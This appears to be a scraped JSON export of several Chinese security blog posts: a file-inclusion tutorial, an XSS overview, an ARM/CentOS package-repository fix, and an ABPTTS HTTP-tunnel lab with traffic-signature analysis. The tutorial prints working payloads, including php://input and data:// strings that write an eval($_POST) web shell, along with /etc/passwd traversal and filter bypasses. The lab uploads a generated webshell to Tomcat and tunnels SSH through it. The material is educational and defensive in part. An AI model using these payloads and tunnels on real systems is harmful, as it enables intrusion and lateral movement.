TOMCAT弱口令 msf https://github.com/k8gege/Ladon/wiki/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4-TomcatScan%E6%A8%A1%E5%9D%97Tomcat%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B burpsuite 参考文章https://www.wangan.com/articles/2173 https://www.wangan.com/articles/2173#064b3d","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"文件包含漏洞原理及常见攻击方式","slug":"文件包含漏洞原理及常见攻击方式","date":"2022-09-26T16:49:21.000Z","updated":"2024-11-12T07:00:00.000Z","comments":true,"path":"2022/09/27/文件包含漏洞原理及常见攻击方式/","permalink":"https://gryffinbit.top/2022/09/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"介绍 即file inclusion，意思是文件包含，是指当服务器开启allow_url_include选项时，就可以通过PHP的某些特性函数（include()，require()和include_once()，requir_once()）利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了PHP配置中的allow_url_fopen选项，选项开启之后，服务器允许包含一个远程文件，服务器通过PHP特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。 文件包含即程序通过包含函数调用本地或远程文件，以此来实现拓展功能 被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。 文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等函数。 本地文件包含LFI（local file include）当被包含的文件在服务器本地时，就形成本地文件包含 远程文件包含RFI（remote file include）当被包含的文件在第三方服务器时，叫做远程文件包含。 PHP文件包含的函数include( ) ： 当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时给出一个警告，继续向下执行。 include_once( ) : 功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次 require( ) require()与 include()的区别： require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。 require_once( )与 require() 区别：require_once( ) 功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次 远程文件包含 当包含的文件在远程服务器上时，就形成了远程文件包含 远程文件包含的注意点： 需要php.ini中allow_url_include = on以及allow_url_fopen=on 所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的， 那么包含的远程服务器文件后缀不能是php) 远程文件包含如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞称为远程文件包含漏洞 本地文件包含能过打开并包含本地文件的漏洞，被称为本地文件包含漏洞。 本地文件包含漏洞只能查看或运行本地文件。但是，其实我们可以使用PHP的伪协议等方式来利用本地文件包含漏洞，接下来讲的是如下几种利用方式： PHP伪协议（较为通用） 包含Session文件 包含日志（较为通用） 包含environ文件 包含临时文件 包含上传文件 伪协议php:&#x2F;&#x2F;协议12php://inputphp://filter php:&#x2F;&#x2F;input用于执行PHP代码，php:&#x2F;&#x2F;filter用于读取源码。 php:&#x2F;&#x2F;filter 👇 php:&#x2F;&#x2F;filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启allow_url_include。 用法： 1?file=php://filter/convert.base64-encode/resource=xxx.php 页面源代码为index.php 12url: http://localhost/test/index.php?file=php://filter/read=convert.base64-encode/resource=index.phpresult: PD9waHAgc3lzdGVtKCdpcGNvbmZpZycpOz8+ base64解密就可以看到内容，这里如果不进行base64_encode，则被include进来的代码就会被执行，导致看不到源代码。 base64内容：&lt;?php system(&#39;ipconfig&#39;);?&gt; php:&#x2F;&#x2F;input 👇 php:&#x2F;&#x2F;input协议主要用于访问各个输入&#x2F;输出流。CTF中经常使用file_get_contents获取php:&#x2F;&#x2F;input内容(POST)，需要开启allow_url_include，并且当enctype=&quot;multipart/form-data&quot;的时候 php:&#x2F;&#x2F;input是无效的。 利用方式：?file=php://input 数据利用POST传过去 碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。 页面源代码 123456&lt;?php$file = $_GET[&#x27;file&#x27;];if (@file_get_content($file) == &#x27;meizijiu&#x27;) &#123; echo $flag;&#125;?&gt; post数据（利用hackbar） 1http://xxxx/?file=php://input post的数据为meizijiu 或者写入一句话 12345http://www.inc.com/inc.php?file=php://inputpost数据:&lt;?php echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));?&gt; base64内容：&lt;?php eval($_POST[&#39;cc&#39;])?&gt; data:&#x2F;&#x2F;协议 php.ini：allow_url_include&#x3D;On、allow_url_fopen()都为On 利用data:&#x2F;&#x2F;伪协议进行代码执行的思路原理和php:&#x2F;&#x2F;是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。 页面示例代码： 123456789&lt;?phpecho &#x27;for test&#x27;;include($_GET[&#x27;file&#x27;]);?&gt;http://www.inc.com/inc.php?file=data://text/plain,&lt;?php phpinfo()?&gt;http://www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=http://www.inc.com/inc.php?file=data:text/plain,&lt;?php phpinfo()?&gt;http://www.inc.com/inc.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=http://www.inc.com/inc.php?file=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs/Pg== 最后一个base64内容为 123&lt;?php echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4=&quot;));?&gt; 最后一个URL使用file_put_contents()函数将&lt;?php eval($_POST[&#39;cc&#39;])?&gt;写到了test.php文件当中 phar:&#x2F;&#x2F;协议 php版本 ≥ 5.3 phar:&#x2F;&#x2F;：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下方式进行利用。 利用方式：写入一句话shell.php -&gt; 压缩为shell.zip -&gt; 修改后缀为shell.jpg -&gt;上传到网站 -&gt; phar:&#x2F;&#x2F;shell.jpg&#x2F;shell.php 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下： 指定绝对路径： 1index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt zip:&#x2F;&#x2F;协议 php版本 ≥ 5.3 利用和构造zip包的方法同phar:&#x2F;&#x2F;协议，但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 1index.php?file=zip://D:\\phpStudy\\WWW\\fileinclude\\test.zip%23phpinfo.txt 包含session文件前提条件：Session文件路径已知，且其中内容的部分可控。 首先第一个条件：Session的文件路径可以在php.ini中的session.save_path查看到： 一般而言，session文件的存放位置为： &#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID &#x2F;tmp&#x2F;sess_PHPSESSID &#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID 包含日志文件前提条件：要知道服务器日志的存储路径，且日志文件可读。 服务器一般回在Web Server的access_log里记录客户端的请求信息，在error_log里记录出错信息。所以攻击者可以间接地将PHP代码写入日志文件，在文件包含时，只需要包含日志文件即可。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改。 例如将PHP代码写入 /var/log/apache2/access.log。然后进行包含即可。 包含environ文件/proc/self/environ文件里面有Web进程运行时的环境变量，其中很多都是用户可以控制的，最常见的做法就是在User-Agent中注入PHP代码。 包含临时文件以上这些方法都要求PHP能过包含这些不处于Web目录下的文件，如果PHP设置了open_basedir，则很可能会使得攻击失效。 php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf) 包含上传文件XMAN夏令营-2017-babyweb-writeup 绕过方式00字符截断 这种方式需要 PHP版本&lt;&#x3D;5.2 用户能够控制file参数，当file的值为../../etc/passwd\\0时，相当于执行了include &#39;/home/wwwrun/../../etc/passwd&#39;这条语句。 如果不适用\\0截断的话，被包含的文件实际上是/etc/passwd.php，但这个文件自然是不存在的。所以在这个地方，攻击者只要在最后加入一个0字节（\\x00），就能截断file变量之后的字符串。 如果是通过Web输入，只需要UrlEencode变为： 1../../etc/passwd%00 防御方式：过滤\\00截断字符，过滤代码如下： 12345678910&lt;?phpfunction getVal($name)&#123; $value = isset($_GET[$name]) ? $_GET[$name] : null; if (is_string($value)) &#123; $value = str_replace(&quot;\\0&quot;, &#x27;&#x27;, $value); &#125;&#125;?&gt; 超长字符截断目录字符串在Windows下256字节、Linux下4096字节时，会达到最大值，最大值之后的字符被丢弃。可以通过./的方式构造目录： 123././././././././././././abc//////////////////abc../1/abc../1/abc../1/abc 目录遍历除了这种攻击方式，还可以使用”…&#x2F;…&#x2F;…&#x2F;“这样的方式来返回到上层目录中，这种方式又被称为”目录遍历(Path Traversal)”。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF) ： 12345678%2e%2e%2f -&gt; ../%2e%2e/ -&gt; ../..%2f -&gt; ../%2e%2e%5c -&gt; ..\\%2e%2e%\\ -&gt; ..\\..%5c -&gt; ..\\%252e%252e%255c -&gt; ..\\..%255c -&gt; ..\\ 防御方式 目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。open_basedir的作用是限制在某个特定目录下PHP能打开的文件。 需要注意的是，open_basedir的值是目录的前缀，如果设置如下： 1open_basedir = /home/aaa 那么以下的目录都是被允许的： 123/home/aaa/home/aaa/bbb/home/aaa/ccc 如果要限定一个指定的目录，则需要在后面加上一个/： 1&gt;open_basedir = /home/aaa/ URL绕过query（?）1index.php?file=http://remoteaddr/remoteinfo.txt? 则包含的文件为 http://remoteaddr/remoteinfo.txt?/test/test.php 。 问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。 fragment(#)1index.php?file=http://remoteaddr/remoteinfo.txt%23 则包含的文件为http://remoteaddr/remoteinfo.txt#/test/test.php 。 问号后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。 参考文章https://ca01h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"文件包含","slug":"Web安全/文件包含","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"author":"Gryffinbit"},{"title":"XSS的形成原理（不同类型）","slug":"XSS的形成原理（不同类型）","date":"2022-09-22T10:22:42.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/09/22/XSS的形成原理（不同类型）/","permalink":"https://gryffinbit.top/2022/09/22/XSS%E7%9A%84%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%EF%BC%89/","excerpt":"","text":"原理XSS：跨站脚本攻击 是一种注入攻击，当web应用对用户输入过滤不严谨时，攻击者写入恶意的脚本代码到网页中，如果用户访问了含有恶意代码的网页，恶意脚本就会被浏览器解析执行并导致用户被攻击。 常见的危害包括： 网络钓鱼，包括获取各类用户账号 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等 强制弹出广告页面、刷流量等 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等 进行大量的客户端攻击，如ddos等 获取客户端信息，如用户的浏览历史、真实ip、开放端口等 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf，实施进步危害； 提升用户权限，包括进一步渗透网站 传播跨站脚本蠕虫等 xss常见出现的地方 数据交互的地方 post、get、cookie、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 数据输出的地方 用户资料 关键词、标签、说明 文件上传 防御手段 对输入进行过滤 对输出进行转义 反射型XSS非持久型XSS。这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储在服务端。 常见注入点:网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。漏洞产生原因一般是网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的数据中存在可被浏览器执行的代码数据 攻击方式攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。 反射型XSS攻击的流程如下： 攻击者寻找具有漏洞的网站 攻击者给用户发了一个带有恶意字符串的链接 用户点击了该链接 服务器返回HTML文档，此时该文档已经包含了那个恶意字符串 客户端执行了植入的恶意脚本，XSS攻击就发生 存储型XSS持久型XSS，更具有威胁性。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型。跨站代码存储于服务端。 常见注入点论坛、博客、留言板、网站的留言、评论、日志等交互处。造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。 攻击方式攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了 恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 存储型ⅩSS攻击的流程如下 用户提交了一条包含XSS代码的留言到数据库 当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来 浏览器发现有XSS代码，就当做正常的HTML和JS解析执行 DOM型XSSDOM是文档对象模型Document Object Model。它是HTML文档的对象表示，同时也是外部内容（例如javascript）与html元素之间的接口。解析树的根节点是“document”对象。使用DOM使程序和脚本能够动态访问和更新文档的内容、结构和样式。它是基于DOM文档对象的一种漏洞，并且DOM型XSS是基于JS上的，并不需要与服务器进行交互。 其通过修改页面DOM节点数据信息而形成的ⅩSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。 一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题 注入点通过js脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所 以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。 攻击方式用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存 在XSS漏洞。 攻击流程是这样的： 攻击者寻找具有漏洞的网站 攻击者给用户发了一个带有恶意字符串的链接 用户点击了该链接 服务器返回HTML文档，但是该文档此时不包含那个恶意字符串 客户端执行了该HTML文档里的脚本，然后把恶意脚本植入了页面 客服端执行了植入的恶意脚本，XSS攻击就发生了 反射型XSS与DOM型区别 反射型XSS攻击中，服务器在返回HTML文档的时候，就已经包含了恶意的脚本; DOM型ⅩSS攻击中，服务器在返回HTML文档的时候，是不包含恶意脚本的；恶意脚本是在其执行了非恶意脚本后，被注入到文档里的 通过JS脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。 参考资料https://www.freebuf.com/articles/web/289263.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"XSS","slug":"Web安全/XSS","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/XSS/"}],"tags":[],"author":"Gryffinbit"},{"title":"M1的自救：如何判断报错后是否为arm架构的锅！","slug":"M1的自救：如何判断报错后是否为arm架构的锅！","date":"2022-09-20T17:21:05.000Z","updated":"2024-11-12T06:59:28.000Z","comments":true,"path":"2022/09/21/M1的自救：如何判断报错后是否为arm架构的锅！/","permalink":"https://gryffinbit.top/2022/09/21/M1%E7%9A%84%E8%87%AA%E6%95%91%EF%BC%9A%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%8A%A5%E9%94%99%E5%90%8E%E6%98%AF%E5%90%A6%E4%B8%BAarm%E6%9E%B6%E6%9E%84%E7%9A%84%E9%94%85%EF%BC%81/","excerpt":"","text":"ARM源pip1pip install xx -i https://www.piwheels.org/simple 仓库更换（centos举例）源里面经常会有这种变量： 1https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ $basearch 的值，系统硬件架构(CPU指令集) 架构是aarch64（ARM） $stream 的值，就是系统版本了 版本是CentOS Stream release 9 地址代入该系统变量后的路径就是 1https://mirrors.aliyun.com/centos-stream/9-stream/AppStream/aarch64/os/ 更换源 备份 1sudo mv /etc/yum.repos.d/centos.repo /etc/yum.repos.d/centos.repo.backup 换成阿里源 1sudo vi /etc/yum.repos.d/centos.repo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/BaseOS/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that may be useful#[extras]#name=CentOS-$releasever - Extras - mirrors.aliyun.com#failovermethod=priority#baseurl=https://mirrors.aliyun.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/# http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/extras/$basearch/os/#gpgcheck=1#gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/centosplus/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]name=CentOS-$releasever - PowerTools - mirrors.aliyun.comfailovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/PowerTools/$basearch/os/gpgcheck=1enabled=0gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]name=CentOS-$releasever - AppStream - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 123yum clean allyum makecache sudo yum update 如果想使用dnf的话，使dnf的源也更新 1sudo dnf makecache 添加CRB仓库 1vim /etc/yum.repos.d/centos.repo 最后一行加入 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 12dnf makecacheyum makecache 用crb下载 1dnf --enablerepo=crb install &lt;包名&gt; -y ubuntu安装包时判断仓库、架构可以通过https://pkgs.org/来查看要下载的包，是属于哪个仓库源的 比如： 1dnf install libnetfilter_queue-devel 报错找不到这个包：libnetfilter_queue-devel 在官网查询，找到自己对应的系统版本。可以看到显示这个包是arrch64架构的。 点进去查看详细信息。这里显示了它的仓库是CRB的，所以需要切换仓库下载 1dnf --enablerepo=crb install libnetfilter_queue-devel -y pip包判断pip版本为python2.7的 1pip install httplib2 报错 12345678910 ERROR: Command errored out with exit status 1: command: /usr/bin/python2 /usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517/_in_process.py get_requires_for_build_wheel /tmp/tmp0SlrZb cwd: /tmp/pip-install-p9wQcj/httplib2 Complete output (4 lines): Traceback (most recent call last): File &quot;/usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517/_in_process.py&quot;, line 16, in &lt;module&gt; from importlib import import_module ImportError: No module named importlib ----------------------------------------ERROR: Command errored out with exit status 1: /usr/bin/python2 /usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517/_in_process.py get_requires_for_build_wheel /tmp/tmp0SlrZb Check the logs for full command output. 这时候不要去看 No module named importlib 而是去看报错路径usr/bin/python2 /usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517 实际上可以发现，arm的版本下，没有这条路径。 所以想到应该把pip的源更换为arm的源 1https://www.piwheels.org/simple 1pip install xx -i https://www.piwheels.org/simple 但是安装失败，去查询官网，可以发现 这个包只支持python3.不支持python2.","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"M1","slug":"M1","permalink":"https://gryffinbit.top/tags/M1/"},{"name":"Arm","slug":"Arm","permalink":"https://gryffinbit.top/tags/Arm/"}],"author":"Gryffinbit"},{"title":"abptts流量特征分析","slug":"abptts流量特征分析","date":"2022-09-20T14:25:09.000Z","updated":"2024-11-12T06:59:51.000Z","comments":true,"path":"2022/09/20/abptts流量特征分析/","permalink":"https://gryffinbit.top/2022/09/20/abptts%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/","excerpt":"","text":"Http隧道介绍 通过HTTP协议与代理服务器建立连接，把所有要传送的数据全部封装到HTTP协议里进行传送，协议中包含有要连接的远程主机的IP和端口，连接成功之后会返回给客户端200，表示验证通过。HTTP隧道用于在被限制的网络连接（包括防火墙、NAT和ACL）以及其他限制的情况下在两台计算机之间建立网络链接。 适用环境 获取webshell的主机位于内网，并且该内网主机的icmp、dns、tcp和udp协议等都不能出网，唯一的数据通道是webshell搭建正向代理。 abpttsabptts是一款基于ssl加密的http隧道工具。全程通信数据加密有效对抗检测。 将TCP流量通过HTTP&#x2F;HTTPS进行流量转发，在目前云主机的大环境中，发挥了比较重要的作用，可以通过脚本进行RDP,SSH,Meterpreter的交互与连接。也意味着这样可以建立一个通过80端口得流量出站来逃避防火墙。与其它http隧道不同的是，abptts是全加密。 只支持aspx和jsp。不支持php 环境搭建网络情况虚拟机之间都采用桥接模式，能够互相访问到。tomcat服务器和一个虚拟机组成内网环境。tomcat服务器采用两个网卡。一个对内，形成内网环境，一个对外，可以被kali访问到。 攻击机 Kali Linux 2022.3 amd64 【搭建在MacBookPro上，x86架构】 IP：192.168.0.101 tomcat 服务器 CentOs-Steam-9 Arm64 【搭建在Mac mini pd虚拟机上，ARM架构】外网IP：192.168.0.102 内网IP：10.37.129.1 ubuntu 内网机 【搭建在Mac mini pd虚拟机上，ARM架构】 IP：10.37.129.3 连通情况 kali可以ping通192.168.0.102，可以访问到192.168.0.102:8080的tomcat服务器。 kali无法访问内网机器10.37.129.3 思路整理攻击机A（kali）拿到了服务器B（tomcat centos）的权限。B通过22端口去连接内网机器C（ubuntu），然后把B的22端口映射到攻击机A的某端口上。实现了隧道技术。这样去访问A的那个映射端口，就相当于访问B的22端口。这样走的是http协议。就可以破解了它的限制。（限制udp、tcp这些不能出网） 攻击机kali 可选 需要python2、pip2的版本 12sudo hwclock --hctosys sudo apt-get update 安装pip2的方法 12wget https://bootstrap.pypa.io/pip/2.7/get-pip.pypython2 get-pip.py 12export PATH=/home/&lt;usrname&gt;/.local/bin:$PATH # 添加到普通用户export PATH=/root/.local/bin:$PATH # 添加到root用户 安装httplib2 1pip install httplib2 安装crypto组件 1pip install -i https://pypi.douban.com/simple/ pycryptodome 下载abptts 12git clone https://github.com/nccgroup/ABPTTS.gitcd ABPTTS 生成对应webshell，会在当前目录下生成webshell文件，里面存放着jsp和aspx的webshell文件 1python2 abpttsfactory.py -o webshell ubuntu上面的安装方法 ubuntu服务器 安装python2 123wget https://bootstrap.pypa.io/pip/2.7/get-pip.pypython get-pip.pypip -V 安装httplib2 1pip install httplib2 安装crypto组件 1pip install -i https://pypi.douban.com/simple/ pycryptodome 安装abptts 1git clone https://github.com/nccgroup/ABPTTS.git 生成webshell 1python2 abpttsfactory.py -o webshell 内网机器 centos安装tomcat 下载tomcat，选用了8.0版本 安装Java https://www.oracle.com/java/technologies/downloads/#java8 登录下载需要的java包，选tar.gz的 把java包放进centos，解压到javaweb目录下 1tar -zxv -f jdk-8u341-linux-aarch64.tar.gz -C /usr/local/java 设置环境变量 1vim /etc/profile 添加 1234export JAVA_HOME=/usr/local/java/jdk1.8.0_341export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 使文件生效 1source /etc/profile 添加软链接 1ln -s /usr/local/java/jdk1.8.0_341/bin/java /usr/bin/java 检查 1java -version 安装tomcat 新建tomcat文件夹 12mkdir /usr/local/Tomcat8tar -zxvf apache-tomcat-8.5.82.tar.gz -C /usr/local/Tomcat8/ 提权 1chmod +x /usr/local/Tomcat8/apache-tomcat-8.5.82/bin/*.sh 启动tomcat 12cd /usr/local/Tomcat8/apache-tomcat-8.5.82/bin./startup.sh 访问站点 1curl 127.0.0.1:8080 使其他机器可以访问到它的网站 防火墙的一些设置 1234sudo dnf install firewalld -ysystemctl unmask firewalldsudo systemctl enable firewalld --nowsystemctl status firewalld 123firewall-cmd --permanent --zone=public --add-port=8080/tcp firewall-cmd --reloadfirewall-cmd --zone=public --query-port=8080/tcp 同一个局域网的机器可以成功访问到centos上面的tomcat 攻击过程kali 将生成的webshell，上传到tomcat服务器（采用scp上传就可以） 12cd ABPTTS/webshellscp abptts.jsp root@192.168.0.102:/usr/local/Tomcat8/apache-tomcat-8.5.82/webapps/ROOT 上传成功 tomcat服务器centos ssh链接内网机器 1ssh root@10.37.129.3 kali 把centos tomcat的22端口映射到攻击机的7777端口上 12cd ABPTTSpython2 abpttsclient.py -c webshell/config.txt -u http://192.168.0.102:8080/abptts.jsp -f 127.0.0.1:7777/127.0.0.1:22 在攻击机上使用ssh链接127.0.0.1:7777就直连到centos tomcat机器上了 1ssh root@127.0.0.1 -p 7777 抓包分析在tomcat centos 服务器上，监听外网网口。kali连接。抓取流量包分析 走的是http协议 追踪http数据流，发现请求头里都包含以下流量特征： 是解密用的key 1HorrendousDepartment= 有一个特殊字段 1x-nearness-ennobling-auditioned: tJRfAOSJ28HF71+Ah/1GrM7mmOBjbe4CnmjTQV7dgiM= 固定的user-agent 1user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705) 